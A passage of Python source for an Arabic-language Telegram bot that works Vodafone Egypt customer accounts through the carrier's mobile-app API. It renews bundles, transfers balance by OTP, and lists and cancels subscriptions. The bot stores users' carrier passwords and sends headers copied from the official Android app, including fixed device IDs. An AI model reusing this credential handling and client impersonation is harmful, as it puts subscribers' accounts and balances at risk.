        # تجديد الباقة
        success2 = False
        products = get_flex_products_note(phone, token)
        if products:
            bundle = find_main_bundle_note(products)
            if bundle and bundle.get('encProductId'):
                success2 = renew_flex_bundle_note(phone, token, bundle)
        
        if success1 and success2:
            return True, f"✅ تم تفعيل نوته 15 وتجديد الباقة بنجاح!\n\n📱 الرقم: `{phone}`"
        else:
            return False, f"❌ فشل التفعيل أو التجديد\n📱 الرقم: `{phone}`"
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def run_note15_option2(phone, password):
    """تشغيل الخيار الثاني: تفعيل نوته 15 فقط"""
    try:
        auth_result = note15_login(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        success = note15_only(phone, token)
        
        if success:
            return True, f"✅ تم تفعيل نوته 15 بنجاح!\n\n📱 الرقم: `{phone}`"
        else:
            return False, f"❌ فشل تفعيل نوته 15\n📱 الرقم: `{phone}`"
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def run_note15_option3(phone, password):
    """تشغيل الخيار الثالث: فحص التاهيل"""
    try:
        auth_result = note15_login(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        success, message = check_note15_eligibility(phone, token)
        
        if success:
            return True, f"✅ {message}"
        else:
            return False, f"❌ {message}"
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def show_note15_markup():
    """عرض أزرار نوته فليكس 15"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(text="📦 تفعيل نوته 15 + تجديد الباقة", callback_data="note15_option1"))
    markup.add(types.InlineKeyboardButton(text="📝 تفعيل نوته 15 فقط", callback_data="note15_option2"))
    markup.add(types.InlineKeyboardButton(text="🔍 فحص التاهيل", callback_data="note15_option3"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['back']} رجوع", callback_data="back_to_main"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

def handle_note15_service(user_id):
    """خدمة نوته فليكس 15 - عرض الخيارات"""
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'note15_waiting_choice',
        'phone': session['phone'],
        'password': session['password']
    }
    
    user_bot.send_message(
        user_id,
        f"{EMOJI['note_15']} *نوته فليكس 15*\n\n📱 الرقم المسجل: `{session['phone']}`\n\n👇 اختر الخدمة المطلوبة:",
        parse_mode='Markdown',
        reply_markup=show_note15_markup()
    )

def handle_note15_callback(call, user_id, option):
    """معالجة اختيار خيار من نوته فليكس 15"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'note15_waiting_choice':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها، يرجى إعادة المحاولة")
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.answer_callback_query(call.id, "جاري التنفيذ...")
    
    if option == "1":
        success, message = run_note15_option1(phone, password)
    elif option == "2":
        success, message = run_note15_option2(phone, password)
    elif option == "3":
        success, message = run_note15_option3(phone, password)
    else:
        success, message = False, "خيار غير صحيح"
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
    
    # حذف البيانات المؤقتة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

def handle_note15_back(call, user_id):
    """العودة من نوته فليكس 15"""
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    user_bot.answer_callback_query(call.id, "تم الإلغاء")
    # العودة إلى قائمة الباقات والعروض
    packages_section = db.get_item_by_name("packages_section")
    if packages_section:
        logged_in, session = is_logged_in(user_id)
        first_name = call.from_user.first_name or "المستخدم"
        if logged_in and session:
            welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
            user_bot.send_message(
                call.message.chat.id,
                welcome_text,
                parse_mode='Markdown',
                reply_markup=level2_markup(packages_section[0], packages_section[3])
            )
        else:
            user_bot.send_message(
                call.message.chat.id,
                f"{EMOJI['error']} *خطأ في الجلسة*",
                parse_mode='Markdown'
            )

# ==================== إعدادات قاعدة البيانات ====================
DB_FILE = "spartan_new.db"
DELETE_OLD_DB_ON_START = False  # ✅ لن يتم حذف قاعدة البيانات أبداً - الحفاظ على بيانات المستخدمين

# ==================== الرموز التعبيرية ====================
EMOJI = {
    "packages": "📦", "manage": "⚙️", "offers": "🎁", "internet": "🌐", "family": "👨‍👩‍👧‍👦", "other": "🛠️",
    "flex": "💪", "flex_discount": "💰", "offers_365": "🎉", "note_packages": "📝", "transfer_flex": "🔄",
    "extend": "⏰", "carryover": "📦", "balance": "💳", "system_details": "📊", "renew": "♻️",
    "line_data": "📋", "stop_line": "⛔", "transfer_balance": "💱", "calls_log": "📞",
    "charge_card": "💎", "due_balance": "💰", "change_pass": "🔑", "cards": "🎴",
    "line_report": "📈", "my_subs": "📌", "number_data": "🔢", "flex_offers": "⚡", "internet_offers": "🚀",
    "offer_55k": "🔥", "offer_22k": "💪", "offer_11k": "✨", "family_flex": "👪", "plus": "➕",
    "extreme": "⚡", "apps": "📱", "next_month": "📅", "send_invite": "📨", "accept_invite": "✅",
    "sent_invites": "📤", "delete_member": "❌", "change_percent": "📊", "owner_percent": "📈", "owner_number": "👤",
    "add_3": "👥", "search": "🔍", "verify": "✅", "count_national": "🔢", "report": "🚫",
    "back": "🔙", "home": "🏠", "warning": "⚠️", "success": "✅", "error": "❌", "info": "ℹ️", "star": "⭐",
    "crown": "👑", "robot": "🤖", "lock": "🔒", "unlock": "🔓", "settings": "⚙️", "stats": "📊", "users": "👥",
    "channels": "📢", "tools": "🛠️", "edit": "✏️", "delete": "🗑️", "add": "➕", "hide": "👁️", "show": "👀",
    "on": "🟢", "off": "🔴", "coming_soon": "🚀", "broadcast": "📢", "bye": "👋", "menu": "📋", "refresh": "🔄",
    "save": "💾", "cancel": "❌", "next": "⏩", "prev": "⏪", "up": "⬆️", "down": "⬇️", "visible": "👁️",
    "invisible": "👁️‍🗨️", "submenu": "📌", "arrow": "👉", "spark": "✨", "disabled": "⚠️", "phone": "📱",
    "key": "🔐", "data": "📊", "time": "⏱️", "price_tag": "🏷️", "gb": "💾", "mb": "📶", "tiktok": "🎵",
    "youtube": "▶️", "facebook": "👤", "instagram": "📸", "whatsapp": "💬", "pubg": "🎮", "anghami": "🎵",
    "watch": "👁️", "bein": "⚽", "send_and_accept": "📤", "riha_balak_offers": "🌟", "moneyback": "💰", "convert_14": "💸", "note_15": "📝",
    "call_history": "📞", "spam_messages": "💣", "rahatabalk_egjbary": "😮‍💨", "trucaller": "🔍", "wallet_search": "💳",
    "recharge": "💎", "activate_21000": "🔥", "delete_debt_21000": "🗑️",
    "tazweed_2days": "⏳"
}

# ==================== الشعار ====================
COMING_SOON_MESSAGE = f"""
{EMOJI['coming_soon']} *خليك متابع، الخدمة دي هتنزل قريب جداً!*

{EMOJI['spark']} *استعد لأحدث الخدمات المميزة من 𝐁𝐑𝐒𝐇𝐀𝐌𝐇 𝐅𝐋𝐄𝐗 💪🏻*
"""

# ==================== دوال استخراج البيانات للشعار الجديد ====================
def get_consumption_data(token, phone):
    """جلب بيانات الاستهلاك"""
    url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
    
    params = {
        '@type': "aggregated",
        'bucket.product.publicIdentifier': phone
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "usageConsumptionHost",
        'useCase': "aggregated",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'msisdn': phone,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        if response.status_code == 200:
            return response.json()
        return None
    except Exception:
        return None

def extract_user_dashboard_data(consumption_data):
    """استخراج بيانات لوحة المستخدم"""
    result = {
        "remaining_balance": None,
        "flex_remaining": None,
        "flex_renewal_date": None,
        "money_back": None,
        "system_type": "نظام غير محدد"
    }
    
    if not consumption_data:
        return result
    
    # استخراج رصيد المال
    for item in consumption_data:
        if item.get("@type") == "Tariff":
            for bucket in item.get("bucket", []):
                for balance in bucket.get("bucketBalance", []):
                    if balance.get("@type") == "Remaining" and balance.get("remainingValue", {}).get("units") == "LE":
                        result["remaining_balance"] = balance["remainingValue"].get("amount")
                        break
    
    # استخراج الفليكسات المتبقية وتاريخ التجديد والماني باك
    for item in consumption_data:
        item_type = item.get("@type", "")
        
        if item_type == "FLEX":
            for bucket in item.get("bucket", []):
                if bucket.get("usageType") == "flex":
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining":
                            result["flex_remaining"] = balance["remainingValue"].get("amount")
                            valid_for = balance.get("validFor")
                            if valid_for and valid_for.get("endDateTime"):
                                result["flex_renewal_date"] = valid_for["endDateTime"]
        
        elif item_type == "OTHERS":
            for bucket in item.get("bucket", []):
                usage_type = bucket.get("usageType", "")
                if usage_type == "count":
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining":
                            if result["flex_remaining"] is None:
                                result["flex_remaining"] = balance["remainingValue"].get("amount")
                elif usage_type == "money":
                    for balance in bucket.get("bucketBalance", []):
                        if balance.get("@type") == "Remaining":
                            result["money_back"] = balance["remainingValue"].get("amount")
    
    # تحديد نوع النظام من بيانات الباقة
    for item in consumption_data:
        if item.get("@type") == "Tariff":
            for bucket in item.get("bucket", []):
                for balance in bucket.get("bucketBalance", []):
                    if balance.get("@type") == "Remaining":
                        units = balance.get("remainingValue", {}).get("units", "")
                        if units == "LE":
                            result["system_type"] = "نظام مسبق الدفع"
                        elif units == "FLEX":
                            result["system_type"] = "نظام فليكس"
                        break
    
    return result

def format_date_arabic(date_str):
    """تنسيق التاريخ بالعربية"""
    if not date_str:
        return "غير محدد"
    try:
        dt = datetime.fromisoformat(date_str.replace('Z', '+00:00').replace('+0000', '+00:00'))
        month_names = {
            1: "يناير", 2: "فبراير", 3: "مارس", 4: "أبريل",
            5: "مايو", 6: "يونيو", 7: "يوليو", 8: "أغسطس",
            9: "سبتمبر", 10: "أكتوبر", 11: "نوفمبر", 12: "ديسمبر"
        }
        return f"{dt.day} {month_names[dt.month]} {dt.year}"
    except:
        return date_str

def get_main_bundle_name_from_subs(token, phone):
    """جلب اسم الباقة الرئيسية من الاشتراكات لعرضه كـ 'نظامك الحالي'"""
    try:
        success, data = get_subscriptions(token, phone)
        if not success or not data:
            return None
        
        for item in data:
            prod_type = item.get("@type", "")
            item_id = item.get("id", "")
            status_raw = (item.get("status", "") or "").lower()
            
            # نبحث عن الباقة الرئيسية النشطة فقط (Flex أو Tariff)
            is_flex = ((prod_type == "Flex") or ("Flex" in item_id)) and "MI_" not in item_id and "Plus" not in item_id
            
            if not is_flex:
                continue
            
            # نجيب الاسم من description في productPrice
            desc = ""
            for p in item.get("productPrice", []):
                if p.get("description"):
                    desc = p.get("description")
                    break
            
            if not desc:
                # نجرب من اسم المنتج
                spec = item.get("productSpecification", {})
                if spec:
                    desc = spec.get("name", "")
            
            if not desc:
                desc = item_id
            
            # تنظيف الاسم
            desc = desc.replace("Flex", "فليكس").replace("bundle", "باقة")
            
            if desc:
                return desc
        
        return None
    except:
        return None

# ==================== وظيفة الشعار الجديد بعد تسجيل الدخول (تم تعديلها) ====================
def get_welcome_dashboard(first_name, phone, password, token=None):
    """إنشاء شعار لوحة التحكم بعد تسجيل الدخول - رسالة بسيطة"""
    return f"✅ تم تسجيل الدخول\nاختر من الأزرار السفلية"

# ==================== وظائف من ملف تحويل رصيد جديد.py (دمج) ====================
def api_get_current_balance(token, phone):
    """جلب الرصيد الحالي"""
    url = f"https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?%40type=aggregated&bucket.product.publicIdentifier={phone}"
    
    headers = {
        'Authorization': f'Bearer {token}',
        'api-host': 'usageConsumptionHost',
        'useCase': 'aggregated',
        'api-version': 'v2',
        'clientId': 'AnaVodafoneAndroid',
        'device-id': 'd522d78db1a7a4d6',
        'x-agent-device': 'OPPO CPH2699',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'x-agent-operatingsystem': '15',
        'msisdn': phone,
        'Accept': 'application/json',
        'Accept-Language': 'ar',
        'User-Agent': 'okhttp/4.12.0',
        'Content-Type': 'application/json'
    }

    try:
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list):
                for item in data:
                    if item.get('@type') == 'Tariff':
                        buckets = item.get('bucket', [])
                        for bucket in buckets:
                            balances = bucket.get('bucketBalance', [])
                            for b in balances:
                                if b.get('@type') == 'Remaining':
                                    val = b.get('remainingValue', {})
                                    return float(val.get('amount', 0))
            return 0.0
        else:
            return None
    except Exception as e:
        return None

def api_send_sms(token, sender_num, receiver_num, amount):
    """إرسال طلب الحصول على كود التأكيد"""
    url = "https://mobile.vodafone.com.eg/services/dxl/verser/send"
    headers = {
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "clientId": "AnaVodafoneAndroid",
        "msisdn": sender_num,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "okhttp/4.11.0"
    }
    data = {
        "useCase": "BalanceTransfer",
        "userId": sender_num,
        "userType": "private",
        "language": "ar",
        "characteristicValues": [
            {"key": "receiverMSISDN", "value": receiver_num},
            {"key": "receiverAmount", "value": amount}
        ]
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        return False

def api_confirm_transfer(token, sender_num, receiver_num, amount, otp_code):
    """تأكيد التحويل باستخدام الكود"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pbm/prepayBalanceManagement/v4/transferBalance"
    headers = {
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "clientId": "AnaVodafoneAndroid",
        "msisdn": sender_num,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "okhttp/4.11.0"
    }
    data = {
        "amount": {"amount": amount},
        "bucket": {"id": sender_num},
        "channel": {"name": "android"},
        "characteristic": {"name": "name", "value": otp_code},
        "receiver": {"id": receiver_num},
        "@type": "transfer"
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=30)
        if response.status_code in [200, 201]:
            return True, response.json()
        return False, response.text
    except Exception as e:
        return False, str(e)

def get_friendly_error_message(raw_response_text):
    """ترجمة رسائل الخطأ"""
    try:
        data = json.loads(raw_response_text)
        code = str(data.get("code", ""))
        reason = str(data.get("reason", "")).lower()
        message = str(data.get("message", "")).lower()

        if "invalid code" in reason or "invalid code" in message or code == "2123":
            return "كود التأكيد غير صحيح أو منتهي الصلاحية"
        
        if "expired" in reason or "expired" in message:
            return "كود التأكيد غير صحيح أو منتهي الصلاحية"

        if "insufficient" in reason or "balance" in reason or code == "2102":
            return "رصيدك الحالي غير كافٍ لإتمام عملية التحويل"

        if "limit" in reason or "exceeded" in reason:
            return "لقد تجاوزت الحد اليومي أو الشهري المسموح به للتحويل"

        return f"فشلت العملية: {message or reason}"

    except json.JSONDecodeError:
        return "حدث خطأ في الاتصال بالسيرفر"
    except Exception:
        return "حدث خطأ غير متوقع"

def run_transfer_balance(sender_phone, sender_password, receiver_num, amount):
    """تشغيل خدمة تحويل الرصيد"""
    try:
        auth_result = get_authorization(sender_phone, sender_password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        
        # جلب الرصيد الحالي
        current_balance = api_get_current_balance(token, sender_phone)
        if current_balance is not None and current_balance < amount:
            return False, f"❌ الرصيد غير كافٍ! الرصيد الحالي: {current_balance:.2f} جنيه"
        
        # إرسال طلب الحصول على الكود
        if not api_send_sms(token, sender_phone, receiver_num, str(amount)):
            # محاولة إعادة تسجيل الدخول
            auth_result2 = get_authorization(sender_phone, sender_password)
            if not auth_result2['success']:
                return False, "❌ فشل إرسال كود التأكيد، حاول مرة أخرى"
            token2 = auth_result2['token']
            if not api_send_sms(token2, sender_phone, receiver_num, str(amount)):
                return False, "❌ فشل إرسال كود التأكيد، حاول مرة أخرى"
        
        return True, "✅ تم إرسال كود التأكيد إلى رقم المرسل"
        
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def run_confirm_transfer(sender_phone, sender_password, receiver_num, amount, otp_code):
    """تأكيد تحويل الرصيد بالكود"""
    try:
        auth_result = get_authorization(sender_phone, sender_password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        success, response = api_confirm_transfer(token, sender_phone, receiver_num, str(amount), otp_code)
        
        if success:
            # جلب الرصيد الجديد
            new_balance = api_get_current_balance(token, sender_phone)
            result_message = f"✅ تم تحويل {amount:.2f} جنيه إلى {receiver_num} بنجاح!"
            if new_balance is not None:
                result_message += f"\n💰 الرصيد المتبقي: {new_balance:.2f} جنيه"
            return True, result_message
        else:
            error_msg = get_friendly_error_message(response)
            return False, f"❌ فشل التحويل: {error_msg}"
            
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

# ==================== وظائف من ملف اشتراكاتي جديد.py (دمج) - النسخة الجديدة بالأزرار ====================
def get_subscriptions(token, number):
    """جلب الاشتراكات"""
    url = f"https://mobile.vodafone.com.eg/services/dxl/pim/product?relatedParty.id={number}&@type=AllInOne&relatedParty.name=SubscriptionManagement"
    headers = {
        "api-host": "ProductInventoryManagementHost",
        "useCase": "AllInOne",
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-build": "1121",
        "x-agent-version": "2026.2.4",
        "x-agent-operatingsystem": "16",
        "device-id": "d522d78db1a7a4d6",
        "msisdn": number,
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Host": "mobile.vodafone.com.eg",
        "User-Agent": "okhttp/4.12.0"
    }
    try:
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code == 200:
            return True, response.json()
        else:
            return False, f"فشل جلب البيانات (الكود: {response.status_code})"
    except Exception as e:
        return False, f"خطأ أثناء جلب الاشتراكات: {e}"

def cancel_subscription(token, number, item_id, enc_product_id):
    """إلغاء الاشتراك"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    headers = {
        "api-host": "ProductOrderingManagement",
        "useCase": "AllInOne", 
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-build": "1121",
        "x-agent-version": "2026.2.4",
        "x-agent-operatingsystem": "16",
        "device-id": "d522d78db1a7a4d6",
        "msisdn": number,
        "Content-Type": "application/json; charset=UTF-8",
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Host": "mobile.vodafone.com.eg",
        "User-Agent": "okhttp/4.12.0"
    }
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "delete",
            "id": item_id,
            "product": {
                "characteristic": [
                    {"name": "LangId", "value": "ar"}, 
                    {"name": "ExecutionType", "value": "Sync"}
                ],
                "encProductId": enc_product_id,
                "id": item_id,
                "relatedParty": [{"id": number, "name": "MSISDN", "role": "Subscriber"}]
            }
        }],
        "@type": "FreeAppOptin"
    }
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=20)
        if response.status_code in [200, 201, 204]:
            return True, "تم إرسال طلب إلغاء العرض بنجاح! ✅"
        else:
            return False, f"فشل الإلغاء. السيرفر رد بالكود: {response.status_code}"
    except Exception as e:
        return False, f"خطأ أثناء الاتصال للإلغاء: {e}"

def format_subscriptions_with_buttons(data):
    """تنسيق الاشتراكات مع أزرار للإلغاء"""
    if not data:
        return None, "❌ لا توجد اشتراكات أو عروض مسجلة."

    def fmt_price(val):
        return f"{int(val)}" if float(val).is_integer() else f"{float(val):.2f}"

    top_sections = []  # للباقات والعروض
    due_items = []     # للرصيد المستحق
    total_due = 0.0
    cancelable_items = {}  # تخزين العناصر القابلة للإلغاء مع أزرارها

    for i, item in enumerate(data):
        prod_type = item.get("@type", "")
        item_id = item.get("id", "")
        enc_id = item.get("productOffering", {}).get("encProductId", "")
        status_raw = item.get("status", "")
        chars = item.get("characteristic", [])
        
        # تحديد حالة الباقة
        status_lower = status_raw.lower() if status_raw else ""
        if status_lower == "active": 
            status_ar = "نشط"
        elif status_lower in ["grace", "suspended", "suspend"]: 
            status_ar = "الباقة منتهية" if "Flex" in prod_type or "Flex" in item_id else "متوقف"
        elif status_lower in ["inactive", "stopped"]: 
            status_ar = "متوقف"
        elif status_lower in ["migration", "pending"]: 
            status_ar = "قيد التحويل 🔄"
        else: 
            status_ar = status_raw

        # استخراج التاريخ
        expiry_date = "غير متوفر"
        for date_field in ["PromoExpiryDate", "RenewalDate", "OfferDateFormat"]:
            found = False
            for c in chars:
                if c.get("name") == date_field:
                    val = c.get("value")
                    if val and val != "null" and "T" in val:
                        expiry_date = val.split("T")[0]
                        found = True
                        break
            if found:
                break

        # استخراج الأسعار والاسم
        desc = ""
        original_price = 0.0
        due_price = 0.0

        prices = item.get("productPrice", [])
        
        # السعر الأصلي
        for p in prices:
            if p.get("description"):
                desc = p.get("description")
            
            val_raw = p.get("price", {}).get("taxIncludedAmount", {}).get("value", "0")
            val_float = float(val_raw)

            if not p.get("id", "").startswith("OPT-IN"):
                if val_float > 0 and original_price == 0:
                    original_price = val_float / 100

        # السعر المستحق
        opt_in_found = False
        for p in prices:
            if p.get("id") == "OPT-IN":
                for pc in p.get("priceCharacteristic", []):
                    if pc.get("name") == "amountToPay":
                        due_price = float(pc.get("value", "0"))
                        opt_in_found = True
                break
                
        if not opt_in_found:
            for p in prices:
                if p.get("id") in ["OPT-IN-AFB", "OPT-IN-TAX", "OPT-IN-CARD"]:
                    for pc in p.get("priceCharacteristic", []):
                        if pc.get("name") == "amountToPay":
                            due_price = float(pc.get("value", "0"))
                            opt_in_found = True
                    if opt_in_found: break

        # تصحيح السعر المستحق
        if due_price == 0.0 and original_price > 0 and not opt_in_found:
            if status_lower in ["grace", "suspended", "suspend", "stopped", ""]:
                due_price = original_price

        # تصنيف العنصر
        is_internet = (prod_type == "MI") or ("Plus" in item_id) or ("MI_" in item_id)
        is_flex = ((prod_type == "Flex") or ("Flex" in item_id)) and not is_internet
        is_tax = "Tax" in prod_type or "Credit_StampTax" in item_id
        is_acp = "ACPFees" in item_id or "النوتة" in desc or "نوتة" in desc
        is_shokran = "Shokran" in item_id or "شكرا" in desc
        is_calltone = "Tone" in item_id or "RBT" in item_id or "تون" in desc or prod_type == "RBT"
        is_addon = "MCKPrepaid" in prod_type or "الاحتفاظ" in desc or "Katch" in item_id or "MCA" in item_id

        # تنظيف الاسم
        if not desc:
            if is_flex: desc = "باقة فليكس"
            elif is_internet: desc = "باقة إنترنت"
            elif is_tax: desc = "ضريبة الدمغة"
            elif is_calltone: desc = "كول تون"
            elif is_addon: desc = "الخدمات الإضافية"
            elif is_acp: desc = "باقة علي النوتة"
            elif is_shokran: desc = "خدمات شكرا"
            else: desc = item_id

        desc = desc.replace("Flex", "فليكس").replace("bundle", "باقة").replace("Tone", "كول تون").replace("RBT", "كول تون")
        desc = desc.replace("MCA", "خدمة الاحتفاظ بالمكالمات").replace("Retention", "الاحتفاظ بالمكالمات")

        has_discount = 0 < due_price < original_price
        
        # عرض الباقات والعروض
        if not is_tax and not is_shokran and not is_acp:
            if (original_price == 0 and due_price == 0 and (status_ar == "" or status_ar == status_raw)):
                continue
            
            if status_ar == "" and original_price == 0 and due_price == 0:
                continue

            section_text = ""
            
            if is_flex:
                if has_discount:
                    section_text += f"💰 عرض خصم ع باقة فليكس\n"
                    section_text += f"• الباقة: {desc}\n"
                    section_text += f"• السعر الأصلي: {fmt_price(original_price)} جنيه\n"
                    section_text += f"• سعر الخصم: {fmt_price(due_price)} جنيه\n"
                    section_text += f"⏱️ تاريخ انتهاء العرض: {expiry_date}"
                elif due_price > 0 or original_price > 0:
                    section_text += f"📦 {desc}\n"
                    if original_price > 0:
                        section_text += f"💰 السعر: {fmt_price(original_price)} جنيه\n"
                    if status_ar and status_ar != status_raw:
                        section_text += f"• الحالة: {status_ar}\n"
                    if expiry_date != "غير متوفر" and expiry_date:
                        section_text += f"⏱️ تاريخ التجديد: {expiry_date}"
                    section_text = section_text.rstrip('\n')
            
            elif is_internet:
                if has_discount:
                    section_text += f"💰 عرض خصم على باقة الإنترنت\n"
                    section_text += f"• خصم على {desc}\n"
                    section_text += f"• السعر مع الخصم: {fmt_price(due_price)} جنيه بدلًا من {fmt_price(original_price)} جنيه\n"
                    section_text += f"⏱️ تاريخ انتهاء العرض: {expiry_date}"
                elif due_price > 0 or original_price > 0:
                    section_text += f"🌐 {desc}\n"
                    if original_price > 0:
                        section_text += f"💰 السعر: {fmt_price(original_price)} جنيه\n"
                    if status_ar and status_ar != status_raw:
                        section_text += f"• الحالة: {status_ar}\n"
                    if expiry_date != "غير متوفر" and expiry_date:
                        section_text += f"⏱️ تاريخ التجديد: {expiry_date}"
                    section_text = section_text.rstrip('\n')
            
            elif is_calltone:
                if due_price > 0 or original_price > 0:
                    section_text += f"🎵 {desc}\n"
                    if original_price > 0:
                        section_text += f"💰 السعر الشهري: {fmt_price(original_price)} جنيه\n"
                    if status_ar and status_ar != status_raw:
                        section_text += f"• الحالة: {status_ar}"
                    section_text = section_text.rstrip('\n')
                
            elif is_addon:
                if due_price > 0 or original_price > 0:
                    section_text += f"🧩 {desc}\n"
                    if original_price > 0:
                        section_text += f"💰 السعر: {fmt_price(original_price)} جنيه\n"
                    if expiry_date != "غير متوفر" and expiry_date:
                        section_text += f"📆 التجديد: {expiry_date}\n"
                    if status_ar and status_ar != status_raw:
                        section_text += f"• الحالة: {status_ar}"
                    section_text = section_text.rstrip('\n')
            
            else:
                if due_price > 0 or original_price > 0:
                    section_text += f"🔸 {desc}\n"
                    if original_price > 0:
                        section_text += f"💰 السعر: {fmt_price(original_price)} جنيه\n"
                    if status_ar and status_ar != status_raw:
                        section_text += f"• الحالة: {status_ar}"
                    section_text = section_text.rstrip('\n')

            if section_text:
                top_sections.append(section_text)

        # الرصيد المستحق
        if due_price > 0:
            icon = "▪️"
            display_name = desc

            if is_acp:
                icon = "📦"
                display_name = "تجديد باقة ع النوتة"
            elif is_shokran:
                icon = "📞"
                display_name = "خدمات شكراً والنوته"
            elif is_flex:
                icon = "📄"
                display_name = "باقة فليكس"
            elif is_internet:
                icon = "🌐"
            elif is_calltone:
                icon = "🎵"
                display_name = "كول تون"
            elif is_tax:
                icon = "💸"
                display_name = "ضريبة الدمغة"
            elif is_addon:
                icon = "🧩"
            
            due_items.append(f"{icon} {display_name}: {fmt_price(due_price)} جنيه")
            total_due += due_price

        # العناصر القابلة للإلغاء (الخدمات الإضافية وليس الباقات الأساسية)
        is_migration = status_lower in ["migration", "pending"]
        is_basic_bundle = (is_flex or is_internet) and not (has_discount) and not is_migration
        if enc_id and not is_tax and not is_shokran and not is_acp and not is_basic_bundle:
            cancelable_items[str(i)] = {
                "id": item_id,
                "enc_product_id": enc_id,
                "name": desc,
                "price": due_price if due_price > 0 else original_price
            }

    # تجميع النص
    output = ""
    
    if top_sections:
        output += "\n".join(top_sections) + "\n\n"
    
    output += "💰 الرصيد المستحق عند الشحن:\n\n"
    if due_items:
        output += "\n".join(due_items) + "\n\n"
    else:
        output += "لا يوجد مبالغ مستحقة للرصيد.\n\n"
        
    output += f"📋 الإجمالي: {fmt_price(total_due)} جنيه"
    
    if not top_sections and not due_items:
        return None, "❌ لا توجد اشتراكات أو مبالغ مستحقة."

    return cancelable_items, output

def run_my_subscriptions(phone, password):
    """تشغيل خدمة اشتراكاتي - إرجاع البيانات والأزرار"""
    try:
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}", None
        
        token = auth_result['token']
        success, data = get_subscriptions(token, phone)
        
        if not success:
            return False, f"❌ {data}", None
        
        cancelable_items, formatted_output = format_subscriptions_with_buttons(data)
        return True, formatted_output, cancelable_items
        
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}", None

def run_cancel_subscription(phone, password, item_id, enc_product_id):
    """تشغيل إلغاء الاشتراك"""
    try:
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        success, message = cancel_subscription(token, phone, item_id, enc_product_id)
        return success, message
        
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

# ==================== دوال اشتراكاتي ====================

def handle_my_subs_service(user_id, message=None):
    """خدمة اشتراكاتي - عرض الاشتراكات بأزرار للإلغاء"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        if message:
            try:
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start",
                    message.chat.id,
